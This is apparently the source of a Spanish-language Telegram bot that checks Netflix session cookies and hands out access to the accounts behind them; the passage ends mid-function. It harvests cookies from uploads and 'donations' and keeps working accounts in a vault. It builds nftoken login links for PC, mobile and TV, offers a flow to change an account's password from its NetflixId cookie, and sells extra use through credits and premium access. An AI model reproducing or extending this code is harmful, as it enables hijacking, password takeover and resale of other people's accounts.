#!/usr/bin/env python3
"""
BILL CYPHER CHK NF — Edition 5G Turbo Definitive
• Todas las funciones y comandos completos y ordenados (Cero NameError)
• Purga atómica de baúl: Cero repetición de cuentas en GEN COOKIE
• Verificación estricta de streaming activo (Cero "Reinicia tu membresía")
• Sesiones Thread-Local 100% aisladas (Cero cruce de perfiles)
• Monitor de carga animado avanzado con fases en tiempo real
• Panel principal compacto optimizado para banner multimedia
• Enlaces oficiales con parámetros web (PC / Mobile / TV8)
• Auto-restauración en arranque desde la nube de Telegram (Anti-Wipe)
• Alertas automáticas de error a @didierJC
"""

import os
import io
import time
import random
import asyncio
import logging
import tempfile
import zipfile
import json
import re
import functools
import threading
import html
import traceback
from datetime import date
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

import requests
from telegram import (
    Update,
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    BotCommandScopeDefault,
    BotCommandScopeChat,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode
from telegram.error import (
    Conflict,
    RetryAfter,
    TimedOut,
    NetworkError,
    Forbidden,
    BadRequest,
)

import checker
from checker import check_cookie, generate_nftoken
import stats as stats_tracker
from dashboard import start_dashboard
import mongodb_store

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.WARNING,
)
for _noisy in ("httpx", "telegram", "apscheduler", "httpcore"):
    logging.getLogger(_noisy).setLevel(logging.ERROR)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") or ""
PORT = int(os.environ.get("PORT", 5000))

# ===========================================================================
# 1. PROPIETARIO Y CONFIGURACIÓN
# ===========================================================================
OWNER_ID: int = 5320997298
OWNER_USER: str = "didierJC"
OWNER_URL: str = f"https://t.me/{OWNER_USER}"
WATERMARK_TEXT: str = "👑 Checked by: @didierJC | BILL CYPHER CHK NF"

def is_admin(uid: int) -> bool:
    return bool(uid and uid == OWNER_ID)

_ASYNC_VAULT_LOCK = asyncio.Lock()
_DONATE_USERS: set[int] = set()


# ===========================================================================
# 2. AISLAMIENTO TOTAL THREAD-LOCAL (ANTI-CRUCE DE PERFILES)
# ===========================================================================
class ThreadLocalSessionProxy:
    """Garantiza que ningún hilo sobreescriba las cookies de otro hilo."""
    def __init__(self):
        self._local = threading.local()

    @property
    def session(self):
        if not hasattr(self._local, "sess"):
            self._local.sess = requests.Session()
        return self._local.sess

    def __getattr__(self, name):
        return getattr(self.session, name)

    def __setattr__(self, name, value):
        if name == "_local":
            super().__setattr__(name, value)
        else:
            setattr(self.session, name, value)

for _attr in list(dir(checker)):
    _obj = getattr(checker, _attr, None)
    if isinstance(_obj, requests.Session):
        setattr(checker, _attr, ThreadLocalSessionProxy())


# ===========================================================================
# 3. TRANSFORMADOR DE TIPOGRAFÍA (Sans-Serif Bold Italic)
# ===========================================================================
def to_sans_bold_italic(text: str) -> str:
    res = []
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:    # A-Z
            res.append(chr(0x1D63C + (o - 65)))
        elif 97 <= o <= 122: # a-z
            res.append(chr(0x1D656 + (o - 97)))
        elif 48 <= o <= 57:  # 0-9
            res.append(chr(0x1D7EC + (o - 48)))
        else:
            res.append(ch)
    return "".join(res)

to_bold_italic = to_sans_bold_italic


# ===========================================================================
# 4. HELPER DE BANDERAS Y PAÍSES
# ===========================================================================
def _flag(country: str) -> str:
    if not country:
        return ""
    country = str(country).strip()
    for ch in country:
        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
            return ""
    code = country.upper()
    if len(code) == 2 and code.isalpha():
        return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))
    NAME_MAP = {
        "india": "IN", "poland": "PL", "portugal": "PT",
        "united states": "US", "usa": "US", "uk": "GB",
        "united kingdom": "GB", "germany": "DE", "france": "FR",
        "italy": "IT", "spain": "ES", "brazil": "BR", "mexico": "MX",
        "canada": "CA", "australia": "AU", "netherlands": "NL",
        "turkey": "TR", "russia": "RU", "japan": "JP",
        "south korea": "KR", "indonesia": "ID", "thailand": "TH",
        "vietnam": "VN", "pakistan": "PK", "bangladesh": "BD",
        "argentina": "AR", "colombia": "CO", "chile": "CL",
        "romania": "RO", "ukraine": "UA", "sweden": "SE",
        "norway": "NO", "denmark": "DK", "finland": "FI",
        "czech": "CZ", "hungary": "HU", "slovakia": "SK",
        "croatia": "HR", "serbia": "RS", "bulgaria": "BG",
        "greece": "GR", "israel": "IL", "saudi arabia": "SA",
        "uae": "AE", "egypt": "EG", "nigeria": "NG",
        "south africa": "ZA", "kenya": "KE",
    }
    code2 = NAME_MAP.get(country.lower())
    if code2:
        return chr(0x1F1E6 + ord(code2[0]) - ord("A")) + chr(0x1F1E6 + ord(code2[1]) - ord("A"))
    return ""

def _country_display(country: str) -> str:
    if not country or str(country).lower() in ("desconocido", "none", ""):
        return "Desconocido"
    try:
        flag = _flag(str(country))
        return f"{country} {flag}".strip() if flag else str(country)
    except Exception:
        return str(country)


# ===========================================================================
# 5. MODO MANTENIMIENTO
# ===========================================================================
_MAINT_FILE = Path("maintenance.json")

def is_maintenance() -> bool:
    if _MAINT_FILE.exists():
        try:
            d = json.loads(_MAINT_FILE.read_text(encoding="utf-8"))
            return bool(d.get("enabled", False))
        except Exception:
            return False
    return False

def set_maintenance(enabled: bool) -> None:
    try:
        _MAINT_FILE.write_text(json.dumps({"enabled": enabled}), encoding="utf-8")
    except Exception as e:
        logger.warning(f"Error guardando maintenance: {e}")

MAINTENANCE_TEXT = (
    "🛠️ <b>" + to_sans_bold_italic("BOT EN MANTENIMIENTO") + "</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "El bot se encuentra actualmente en mantenimiento para actualizar stock y aplicar mejoras.\n\n"
    "⏳ <i>Por favor, espera a que el propietario finalice las actualizaciones para volver a usarlo.</i>"
)


# ===========================================================================
# 6. SISTEMA DE CRÉDITOS (3 DIARIOS / REEMBOLSO AUTOMÁTICO)
# ===========================================================================
DAILY_FREE_CREDITS: int = 3
_CREDITS_FILE = Path("credits.json")

def _load_credits() -> dict:
    if _CREDITS_FILE.exists():
        try:
            return json.loads(_CREDITS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}

def _save_credits(data: dict) -> None:
    try:
        _CREDITS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning(f"Error guardando credits.json: {e}")

def get_user_credits_info(uid: int) -> dict:
    if is_admin(uid):
        return {"type": "owner", "credits": "Ilimitado 👑", "can_use": True}

    data = _load_credits()
    user_data = data.get(str(uid), {})
    today_str = date.today().isoformat()

    if user_data.get("is_premium"):
        creds = user_data.get("credits", "unlimited")
        if creds == "unlimited":
            return {"type": "premium", "credits": "Ilimitado ⭐", "can_use": True}
        try:
            c_val = int(creds)
        except ValueError:
            c_val = 0
        return {"type": "premium", "credits": f"{c_val} restantes ⭐", "can_use": c_val > 0, "balance": c_val}

    last_date = user_data.get("last_date", "")
    used_today = user_data.get("used_today", 0)
    if last_date != today_str:
        used_today = 0
        user_data["last_date"] = today_str
        user_data["used_today"] = 0
        data[str(uid)] = user_data
        _save_credits(data)

    remaining = max(0, DAILY_FREE_CREDITS - used_today)
    return {"type": "normal", "credits": f"{remaining}/{DAILY_FREE_CREDITS} hoy", "can_use": remaining > 0, "balance": remaining}

def consume_credit(uid: int) -> bool:
    if is_admin(uid):
        return True

    data = _load_credits()
    user_data = data.setdefault(str(uid), {"is_premium": False})
    today_str = date.today().isoformat()

    if user_data.get("is_premium"):
        creds = user_data.get("credits", "unlimited")
        if creds == "unlimited":
            return True
        try:
            c_val = int(creds)
        except ValueError:
            c_val = 0
        if c_val <= 0:
            return False
        user_data["credits"] = c_val - 1
        data[str(uid)] = user_data
        _save_credits(data)
        return True
    else:
        last_date = user_data.get("last_date", "")
        used_today = user_data.get("used_today", 0)
        if last_date != today_str:
            used_today = 0
            user_data["last_date"] = today_str

        if used_today >= DAILY_FREE_CREDITS:
            return False

        user_data["used_today"] = used_today + 1
        user_data["last_date"] = today_str
        data[str(uid)] = user_data
        _save_credits(data)
        return True

def refund_credit(uid: int) -> None:
    if is_admin(uid):
        return
    data = _load_credits()
    user_data = data.get(str(uid))
    if not user_data:
        return

    if user_data.get("is_premium"):
        creds = user_data.get("credits")
        if creds != "unlimited":
            try:
                user_data["credits"] = int(creds) + 1
            except ValueError:
                pass
    else:
        used_today = user_data.get("used_today", 1)
        user_data["used_today"] = max(0, used_today - 1)

    data[str(uid)] = user_data
    _save_credits(data)

def add_reward_credit(uid: int, amount: int = 1) -> None:
    data = _load_credits()
    user_data = data.setdefault(str(uid), {"is_premium": False})
    if user_data.get("is_premium"):
        creds = user_data.get("credits")
        if creds != "unlimited":
            try:
                user_data["credits"] = int(creds) + amount
            except ValueError:
                pass
    else:
        used_today = user_data.get("used_today", 0)
        user_data["used_today"] = max(0, used_today - amount)
    data[str(uid)] = user_data
    _save_credits(data)

OUT_OF_CREDITS_TEXT = (
    "⚠️ <b>¡Créditos diarios agotados!</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    f"Has alcanzado el límite de <b>{DAILY_FREE_CREDITS} activaciones gratuitas por hoy</b>.\n\n"
    "💎 <i>Para activar acceso Premium o créditos ilimitados, contacta al propietario:</i>\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)

def out_of_credits_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Adquirir Premium (@didierJC) ↗️", url=OWNER_URL)],
        [InlineKeyboardButton("🔙 Volver al Panel", callback_data="panel:back")],
    ])


# ===========================================================================
# 7. BAÚL ESTRUCTURADO Y PERSISTENCIA CONTROLADA
# ===========================================================================
_VAULT_FILE = Path("cookie_vault.json")
_NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")

def _has_netflix_markers(text: str) -> bool:
    return any(m.lower() in text.lower() for m in _NETFLIX_MARKERS)

def extract_core_netflix_id(cookie_str: str) -> str:
    m = re.search(r'(ct%3D[^\s;\n"\'\r]+)', str(cookie_str), re.IGNORECASE)
    if m:
        return m.group(1).strip()
    m2 = re.search(r'NetflixId\s+([^\s;\n]+)', str(cookie_str), re.IGNORECASE)
    if not m2:
        m2 = re.search(r'NetflixId=([^\s;\n]+)', str(cookie_str), re.IGNORECASE)
    if m2:
        val = m2.group(1).strip()
        if "ct%3D" in val:
            return "ct%3D" + val.split("ct%3D", 1)[1]
        return val
    return ""

def _load_vault() -> list[str]:
    if _VAULT_FILE.exists():
        try:
            raw_data = json.loads(_VAULT_FILE.read_text(encoding="utf-8"))
            if not isinstance(raw_data, list):
                return []
            cleaned = []
            seen_tokens = set()
            for x in raw_data:
                c_str = x.get("cookie") if isinstance(x, dict) else str(x)
                if _has_netflix_markers(c_str):
                    tok = extract_core_netflix_id(c_str)
                    if tok and tok not in seen_tokens:
                        seen_tokens.add(tok)
                        cleaned.append(c_str)
                    elif not tok and c_str not in cleaned:
                        cleaned.append(c_str)
            return cleaned
        except Exception:
            return []
    return []

def _save_vault(items: list) -> None:
    try:
        cleaned = []
        seen_tokens = set()
        for x in items:
            c_str = x.get("cookie") if isinstance(x, dict) else str(x)
            if _has_netflix_markers(c_str):
                tok = extract_core_netflix_id(c_str)
                if tok and tok not in seen_tokens:
                    seen_tokens.add(tok)
                    cleaned.append(c_str)
                elif not tok and c_str not in cleaned:
                    cleaned.append(c_str)
        _VAULT_FILE.write_text(json.dumps(cleaned, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning(f"Error guardando vault: {e}")

def extract_cookies_from_text_block(text: str) -> list[str]:
    text = text.strip()
    if not text or not _has_netflix_markers(text):
        return []

    netscape_lines = [
        line.strip() for line in text.splitlines()
        if ".netflix.com" in line.lower() and any(m.lower() in line.lower() for m in _NETFLIX_MARKERS)
    ]
    if netscape_lines and any("netflixid" in l.lower() for l in netscape_lines):
        return ["\n".join(netscape_lines)]

    blocks = split_cookies_from_text(text)
    clean_blocks = []
    for b in blocks:
        b_clean = b.strip()
        lines = [
            l.strip() for l in b_clean.splitlines()
            if ".netflix.com" in l.lower() and any(m.lower() in l.lower() for m in _NETFLIX_MARKERS)
        ]
        if lines and any("netflixid" in l.lower() for l in lines):
            clean_blocks.append("\n".join(lines))
        elif _has_netflix_markers(b_clean):
            clean_blocks.append(b_clean)

    return clean_blocks or ([text] if _has_netflix_markers(text) else [])

def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list[str]:
    is_zip = filename.lower().endswith(".zip") or raw_bytes.startswith(b"PK\x03\x04")
    extracted = []

    if is_zip:
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    base = Path(info.filename).name
                    if base.startswith(("_", ".")) or base.upper() == "_SUMMARY.TXT":
                        continue
                    if Path(info.filename).suffix.lower() not in COOKIE_EXTENSIONS:
                        continue
                    try:
                        file_data = zf.read(info.filename)
                        text = file_data.decode("utf-8", errors="replace")
                        extracted.extend(extract_cookies_from_text_block(text))
                    except Exception:
                        continue
        except Exception as e:
            logger.warning(f"Error leyendo ZIP: {e}")
    else:
        text = raw_bytes.decode("utf-8", errors="replace")
        extracted.extend(extract_cookies_from_text_block(text))

    return extracted


# ===========================================================================
# 8. VERIFICADOR EN VIVO
# ===========================================================================
def get_live_nftoken(cookie_raw: str, core_token: str) -> dict:
    try:
        res = generate_nftoken(cookie_raw)
        if isinstance(res, dict) and res.get("success"):
            return res
    except Exception:
        pass

    try:
        res = generate_nftoken({"NetflixId": core_token})
        if isinstance(res, dict) and res.get("success"):
            return res
    except Exception:
        pass

    try:
        chk_res = safe_check_cookie_clean(cookie_raw, generate_token=True)
        if chk_res and chk_res.get("nftoken") and chk_res["nftoken"].get("success"):
            return chk_res["nftoken"]
    except Exception:
        pass

    return {}

def extract_bgiqv_token(nft_dict: dict, fallback_token: str) -> str:
    if not isinstance(nft_dict, dict):
        return fallback_token

    for k in ("token", "nftoken", "nf_token"):
        val = nft_dict.get(k)
        if val and "ct%3D" not in str(val) and len(str(val)) > 30:
            return str(val).strip()

    for url_k in ("tv_url", "mobile_url", "pc_url", "url"):
        u = nft_dict.get(url_k, "")
        m = re.search(r'nftoken=([^&\s]+)', str(u))
        if m:
            found = m.group(1).strip()
            if "ct%3D" not in found and len(found) > 30:
                return found

    for k in ("token", "nftoken"):
        if nft_dict.get(k):
            return str(nft_dict[k]).strip()

    return fallback_token

def verify_streaming_active(nftoken: str) -> bool:
    if not nftoken or len(nftoken) < 20:
        return False
    try:
        url = f"https://www.netflix.com/browse?nftoken={nftoken}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        }
        resp = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
        final_url = resp.url.lower()

        if "signup" in final_url or "simplemember" in final_url or "login" in final_url:
            return False

        html_lower = resp.text.lower()
        bad_indicators = [
            "reinicia tu membres",
            "restart your membership",
            "update your payment",
            "actualiza tu informaci",
            "informaçoes de pagamento",
            "reactivate your account",
            "reactivar membres",
            "membership-status-holder",
            "btn-restart",
        ]
        if any(ind in html_lower for ind in bad_indicators):
            return False
        return True
    except Exception:
        return True

def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
    token = raw_token.strip()
    pc_url = f"https://netflix.com/?nftoken={token}"
    mobile_url = f"https://netflix.com/unsupported?nftoken={token}&redirect=true&referrer=oauth_2_via_browser%3Dtrue"
    tv_url = f"https://netflix.com/tv8?nftoken={token}"

    buttons = [
        [
            InlineKeyboardButton("🖥️ 𝙋𝘾 ↗️", url=pc_url),
            InlineKeyboardButton("📱 𝙈𝙤́𝙫𝙞𝙡 ↗️", url=mobile_url),
            InlineKeyboardButton("📺 𝙏𝙑 ↗️", url=tv_url),
        ],
        [
            InlineKeyboardButton("🔄 𝙍𝙀𝙂𝙀𝙉 𝘾𝙊𝙊𝙆𝙄𝙀", callback_data="panel:gencookie"),
            InlineKeyboardButton("🔙 𝙋𝙖𝙣𝙚𝙡", callback_data="panel:back"),
        ]
    ]
    return InlineKeyboardMarkup(buttons)


# ===========================================================================
# 9. BANNER MULTIMEDIA Y CHECKER AISLADO
# ===========================================================================
_BANNER_FILE = Path("banner_id.txt")
BANNER_MEDIA = "banner.mp4"

def _get_banner_source() -> str:
    if _BANNER_FILE.exists():
        val = _BANNER_FILE.read_text(encoding="utf-8").strip()
        if val:
            return val
    return BANNER_MEDIA

def safe_check_cookie_clean(cookie_str: str, **kwargs) -> dict:
    try:
        return check_cookie(cookie_str, **kwargs)
    except Exception as e:
        return {"status": "invalid", "message": str(e)}

def normalize_status(raw_status: str, result_dict: dict = None) -> str:
    st = str(raw_status or "").lower().strip()
    if st in ("hit", "live", "valid", "active", "success"):
        return "hit"
    if st in ("free", "sin_plan"):
        return "free"
    if st in ("on_hold", "hold", "espera"):
        return "on_hold"
    return "invalid"


# ── Registro de usuarios y variables globales ───────────────────────────────
_USERS_FILE = Path("users.txt")

def _record_user_id(uid: int) -> None:
    try:
        if not uid:
            return
        existing = set()
        if _USERS_FILE.exists():
            existing = set(_USERS_FILE.read_text(encoding="utf-8").splitlines())
        if str(uid) not in existing:
            with open(_USERS_FILE, "a", encoding="utf-8") as f:
                f.write(f"{uid}\n")
    except Exception:
        pass

_PROXY_ADD_STATE: set[int] = set()
_PROXY_SOURCE_STATE: set[int] = set()
_EXECUTOR = ThreadPoolExecutor(max_workers=75)

COOKIE_EXTENSIONS = (".txt", ".json", ".cookie", ".cookies")
COOKIE_MIME_TYPES = {
    "text/plain", "application/json", "text/json",
    "application/octet-stream", "text/csv",
}

BULK_CONCURRENCY = 50

_CANCEL_SESSIONS: set[int] = set()
_ACTIVE_USERS: dict[int, float] = {}
SESSION_TIMEOUT_SEC = 15 * 60
_USER_SESSION: dict[int, int] = {}
_BOT_USERNAME: str = ""
_USER_MODE: dict[int, str] = {}
_USER_DELIVERY: dict[int, str] = {}
_CHANGEPW_STATE: dict[int, dict] = {}


# ===========================================================================
# 10. TODAS LAS FUNCIONES DE COMANDOS Y CALLBACKS (DECLARADAS ANTES DE MAIN)
# ===========================================================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        stats_tracker.record_user(uid)
        _record_user_id(uid)

    if is_maintenance() and not is_admin(uid):
        await update.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
        return

    text = _main_panel_text(uid)
    markup = _main_panel_markup(uid)
    await _send_banner_panel(update, text, markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user:
        _record_user_id(update.effective_user.id)
    await update.message.reply_text(_help_text(), parse_mode=ParseMode.HTML)

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    await update.message.reply_text(_info_text(uid), parse_mode=ParseMode.HTML)

async def mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    current = _get_mode(uid)
    await update.message.reply_text(
        f"⚙️ <b>Modo de salida actual:</b> <b>{'Información completa' if current == 'full' else 'Básico'}</b>\n\n"
        "Elige tu modo preferido:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📋 Información completa", callback_data=f"setmode:{uid}:full"),
                InlineKeyboardButton("📄 Básico", callback_data=f"setmode:{uid}:basic"),
            ]
        ]),
    )

async def fullinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _USER_MODE[uid] = "full"
    await update.message.reply_text("✅ Modo de salida establecido en <b>Información completa</b>.", parse_mode=ParseMode.HTML)

async def basic_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _USER_MODE[uid] = "basic"
    await update.message.reply_text("✅ Modo de salida establecido en <b>Básico</b>.", parse_mode=ParseMode.HTML)

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    await update.message.reply_text(_settings_text(uid), parse_mode=ParseMode.HTML, reply_markup=_settings_markup(uid))

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    if not _USERS_FILE.exists():
        await update.message.reply_text("⚠️ No hay usuarios registrados todavía.")
        return

    uids = [u.strip() for u in _USERS_FILE.read_text(encoding="utf-8").splitlines() if u.strip().isdigit()]
    total = len(uids)

    if total == 0:
        await update.message.reply_text("⚠️ No hay usuarios registrados en el archivo.")
        return

    await update.message.reply_text(
        "👥 <b>Base de Datos de Usuarios</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• <b>Total registrados:</b> <code>{total}</code> usuarios únicos\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
    )

    with open(_USERS_FILE, "rb") as f:
        await update.message.reply_document(
            document=f,
            filename="users.txt",
            caption=f"📄 Lista con los {total} IDs registrados",
        )

async def setbanner_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    msg = update.message
    target = msg.reply_to_message if msg.reply_to_message else msg

    file_id = None
    if target.video:
        file_id = target.video.file_id
    elif target.animation:
        file_id = target.animation.file_id
    elif target.photo:
        file_id = target.photo[-1].file_id
    elif target.document and (target.document.mime_type or "").startswith("video/"):
        file_id = target.document.file_id

    if not file_id:
        await update.message.reply_text(
            "🎬 <b>Cómo configurar el video de cabecera:</b>\n\n"
            "1. Envía el video aquí y escribe de pie de foto <code>/setbanner</code>\n"
            "o\n"
            "2. Responde a un video previamente enviado con <code>/setbanner</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    _BANNER_FILE.write_text(file_id, encoding="utf-8")
    await update.message.reply_text("🎬 <b>¡Video de cabecera configurado con éxito!</b>", parse_mode=ParseMode.HTML)

async def changepw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _CHANGEPW_STATE[uid] = {"step": "netflix_id"}
    await update.message.reply_text(
        "🔐 <b>Cambiar Contraseña</b> <i>[BETA]</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Paso 1 de 3 — Introduce el valor de la cookie <b>NetflixId</b> de la cuenta:\n\n"
        "Envía /cancel en cualquier momento para abortar.",
        parse_mode=ParseMode.HTML,
    )

async def donar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    _DONATE_USERS.add(uid)
    await update.message.reply_text(
        "🎁 <b>" + to_sans_bold_italic("DONAR COOKIES DE NETFLIX") + "</b> 🍿\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Envía la cookie en texto o adjunta un archivo <code>.txt</code> que deseas donar al baúl.\n\n"
        "💎 <b>Recompensa automática:</b>\n"
        "<i>Por cada cookie válida (Live con suscripción activa) que dones, recibirás <b>+1 activación extra</b> al instante.</i>\n\n"
        "Envía /cancel en cualquier momento si deseas cancelar.",
        parse_mode=ParseMode.HTML,
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid in _DONATE_USERS:
        _DONATE_USERS.discard(uid)
        await update.message.reply_text("❌ <b>Donación cancelada.</b>", parse_mode=ParseMode.HTML)
        return
    if uid in _CHANGEPW_STATE:
        _CHANGEPW_STATE.pop(uid, None)
        await update.message.reply_text("❌ <b>Cambio de contraseña cancelado.</b>", parse_mode=ParseMode.HTML)
        return
    if uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        await update.message.reply_text("❌ Añadir proxy cancelado.")
        return
    if uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        await update.message.reply_text("❌ Importación cancelada.")
        return
    await update.message.reply_text("No hay operaciones activas para cancelar.")

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return
    from proxy_manager import proxy_manager as pm
    await update.message.reply_text(_proxy_panel_text(), parse_mode=ParseMode.HTML, reply_markup=_proxy_panel_markup(pm))

async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    uid = query.from_user.id if query.from_user else 0
    data = query.data

    if is_maintenance() and not is_admin(uid):
        await query.answer("🛠️ Bot en mantenimiento.", show_alert=True)
        return

    if data == "panel:back":
        await query.answer()
        await _edit_panel_message(query, _main_panel_text(uid), _main_panel_markup(uid))

    elif data == "panel:settings":
        await query.answer()
        await _edit_panel_message(query, _settings_text(uid), _settings_markup(uid))

    elif data == "panel:info":
        await query.answer()
        await _edit_panel_message(query, _info_text(uid), _panel_back_markup())

    elif data == "panel:help":
        await query.answer()
        await _edit_panel_message(query, _help_text(), _panel_back_markup())

    elif data == "panel:changepw":
        await query.answer()
        _CHANGEPW_STATE[uid] = {"step": "netflix_id"}
        await query.message.reply_text(
            "🔐 <b>Cambiar Contraseña</b> <i>[BETA]</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paso 1 de 3 — Introduce el valor de la cookie <b>NetflixId</b> de la cuenta:\n"
            "<i>(la cadena NetflixId que empieza por ct%3D)</i>\n\n"
            "Envía /cancel en cualquier momento para abortar.",
            parse_mode=ParseMode.HTML,
        )

    elif data == "panel:proxy":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        from proxy_manager import proxy_manager as pm
        await _edit_panel_message(query, _proxy_panel_text(), _proxy_panel_markup(pm))

    elif data == "panel:users":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        if not _USERS_FILE.exists():
            await query.message.reply_text("⚠️ No hay usuarios registrados todavía.")
            return
        uids = [u.strip() for u in _USERS_FILE.read_text(encoding="utf-8").splitlines() if u.strip().isdigit()]
        total = len(uids)
        await query.message.reply_text(
            "👥 <b>Base de Datos de Usuarios</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• <b>Total registrados:</b> <code>{total}</code> usuarios únicos\n"
            "━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )
        with open(_USERS_FILE, "rb") as f:
            await query.message.reply_document(
                document=f,
                filename="users.txt",
                caption=f"📄 Lista con los {total} IDs registrados",
            )

    elif data == "panel:vault":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer()
        vault = _load_vault()
        await query.message.reply_text(
            "📦 <b>Gestión del Baúl de Cookies</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• <b>Stock disponible (único):</b> <code>{len(vault)}</code> cuentas listas\n\n"
            "💡 <b>Para agregar cuentas:</b>\n"
            "Envía el archivo <code>.zip</code> generado por el checker con pie de foto <code>/addvault</code>.\n\n"
            "💡 <b>Para vaciar stock:</b>\n"
            "Escribe <code>/clearvault</code>",
            parse_mode=ParseMode.HTML,
        )

    elif data == "panel:toggle_maint":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        new_state = not is_maintenance()
        set_maintenance(new_state)
        await query.answer(f"Mantenimiento {'ACTIVADO 🔴' if new_state else 'DESACTIVADO 🟢'}", show_alert=True)
        await _edit_panel_message(query, _main_panel_text(uid), _main_panel_markup(uid))

    elif data == "panel:synccloud":
        if not is_admin(uid):
            await query.answer("⛔ Solo el propietario.", show_alert=True)
            return
        await query.answer("🔄 Sincronizando desde Telegram Cloud…")
        try:
            chat = await context.bot.get_chat(OWNER_ID)
            if chat.pinned_message and chat.pinned_message.document:
                f = await chat.pinned_message.document.get_file()
                b = await f.download_as_bytearray()
                d = json.loads(b.decode("utf-8", errors="replace"))
                if "vault" in d:
                    _save_vault(d["vault"])
                if "credits" in d:
                    _save_credits(d["credits"])
                if "users" in d and isinstance(d["users"], list):
                    _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
                await query.message.reply_text(f"✅ <b>Sincronización completa:</b> {len(d.get('vault', []))} cuentas restauradas desde la nube.", parse_mode=ParseMode.HTML)
                await _edit_panel_message(query, _main_panel_text(uid), _main_panel_markup(uid))
            else:
                await query.message.reply_text("⚠️ No se encontró mensaje fijado de respaldo en tu chat.", parse_mode=ParseMode.HTML)
        except Exception as e:
